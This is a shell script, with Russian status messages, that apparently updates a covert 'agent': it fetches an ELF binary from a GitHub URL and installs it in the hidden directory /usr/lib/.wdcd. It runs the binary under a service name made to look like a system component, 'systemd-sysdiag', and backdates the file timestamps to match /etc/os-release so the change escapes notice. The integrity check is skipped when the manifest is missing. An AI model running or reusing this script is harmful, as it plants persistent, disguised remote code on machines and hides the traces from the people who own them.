#!/bin/sh
set -e
_dl() {
  if command -v curl >/dev/null 2>&1; then curl -fsSL --connect-timeout 15 --max-time 120 -o "$2" "$1"
  elif command -v wget >/dev/null 2>&1; then wget -q -T 15 -O "$2" "$1"
  elif command -v busybox >/dev/null 2>&1; then busybox wget -q -T 15 -O "$2" "$1"
  elif command -v python3 >/dev/null 2>&1; then python3 -c "import sys,urllib.request as u;u.urlretrieve(sys.argv[1],sys.argv[2])" "$1" "$2"
  else return 1
  fi
}
URL="${1:-https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools/diagd}"
BIN="/usr/lib/.wdcd/bin/sysdiag"
SVC="systemd-sysdiag.service"
TMP="$(mktemp /tmp/sysdiag.XXXXXX)"
cleanup() { rm -f "$TMP" "$TMP.sha" 2>/dev/null || true; }
trap cleanup EXIT
if [ ! -f "$BIN" ]; then
  echo "агент не установлен (нет $BIN). Сначала: ./install.sh" >&2
  exit 1
fi
echo "текущая версия: $("$BIN" --version 2>/dev/null | head -1 || echo unknown)"
echo "скачиваю новый бинарник: $URL"
if ! _dl "$URL" "$TMP"; then
  echo "скачивание не удалось (нет curl/wget/python3)" >&2
  exit 1
fi
_dl "${URL%/diagd}/MANIFEST.sha256" "$TMP.sha" || true
if [ ! -s "$TMP" ]; then echo "скачивание не удалось" >&2; exit 1; fi
NEW_SHA=$(sha256sum "$TMP" | awk '{print $1}')
if [ -s "$TMP.sha" ]; then
  EXPECTED=$(awk '{print $1}' "$TMP.sha" 2>/dev/null)
  if [ -n "$EXPECTED" ] && [ "$EXPECTED" != "$NEW_SHA" ]; then
    echo "SHA256 mismatch: получено $NEW_SHA, ожидалось $EXPECTED" >&2
    exit 1
  fi
  echo "sha256 OK: $NEW_SHA"
else
  echo "предупреждение: MANIFEST.sha256 не скачан, пропускаю сверку" >&2
fi
if ! head -c 4 "$TMP" | od -An -tx1 | grep -q "7f 45 4c 46"; then
  echo "скачанный файл не ELF (вероятно, страница ошибки)" >&2
  exit 1
fi
chmod 755 "$TMP"
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
[ "$_stamp" -gt 0 ] 2>/dev/null && touch -d "@$_stamp" "$TMP" 2>/dev/null || true
if command -v systemctl >/dev/null 2>&1 && systemctl list-unit-files "$SVC" >/dev/null 2>&1; then
  systemctl stop "$SVC" 2>/dev/null || true
  cp -f "$TMP" "$BIN"
  [ "$_stamp" -gt 0 ] 2>/dev/null && touch -d "@$_stamp" "$BIN" 2>/dev/null || true
  systemctl start "$SVC"
  echo "обновлено (systemd): $(systemctl is-active "$SVC")"
else
  cp -f "$TMP" "$BIN"
  if [ -x "$BIN" ]; then
    pkill -x sysdiag 2>/dev/null || true
    nohup "$BIN" --foreground >/dev/null 2>&1 &
  fi
  echo "обновлено (standalone)"
fi
echo "новая версия: $("$BIN" --version 2>/dev/null | head -1 || echo ok)"
echo "done."
